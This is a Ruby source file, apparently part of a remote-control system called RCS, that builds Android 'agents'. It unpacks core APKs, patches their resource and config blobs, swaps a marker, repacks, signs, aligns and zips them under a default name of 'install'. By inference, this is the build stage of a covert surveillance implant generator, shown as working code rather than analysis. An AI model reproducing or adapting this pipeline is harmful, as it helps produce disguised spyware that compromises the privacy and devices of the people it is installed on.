#
#  Agent creation for android
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildAndroid < Build

  def initialize
    super
    @platform = 'android'
  end

  def unpack
    super

    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

    apktool = path('apktool.jar')
    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first

      CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
      
      if File.exist?(path("apk.#{version}/res/raw/resources.bin"))
        @outputs << ["apk.#{version}/res/raw/resources.bin", "apk.#{version}/res/raw/config.bin"]
      else
        raise "unpack failed. needed file not found"
      end
    end
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']
      
    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first

      # add the file to be patched to the params
      # these params will be passed to the super
      params[:core] = "apk.#{version}/res/raw/resources.bin"
      params[:config] = "apk.#{version}/res/raw/config.bin"
      
      # invoke the generic patch method with the new params
      super
      
      patch_file(:file => params[:core]) do |content|
        begin
          method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
          content.binary_patch 'IrXCtyrrDXMJEvOU', method
        rescue
          raise "Working method marker not found"
        end
      end
    end
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'

    apktool = path('apktool.jar')
   	File.chmod(0755, path('aapt')) if File.exist? path('aapt')
    @outputs = []
    
    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first
      apk = path("output.#{version}.apk")

      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}
      
      if File.exist?(apk)
        @outputs << "output.#{version}.apk"
      else
        raise "pack failed."
      end
    end

  end

  def sign(params)
    trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"

    apks = @outputs
    @outputs = []

    apks.each do |d| 
      version = d.scan(/output.(.*).apk/).flatten.first

      apk = path(d)
      output = "#{@appname}.#{version}.apk"
      core = path(output)

      raise "Cannot find keystore" unless File.exist? Config.instance.cert('android.keystore')

      CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('android.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{apk} ServiceCore"

      raise "jarsigner failed" unless File.exist? apk
      
      File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
      CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")

      FileUtils.rm_rf(apk)

      @outputs << output
    end
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |o|
        trace :debug, "adding: #{o}" 
        z.file.open(o, "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
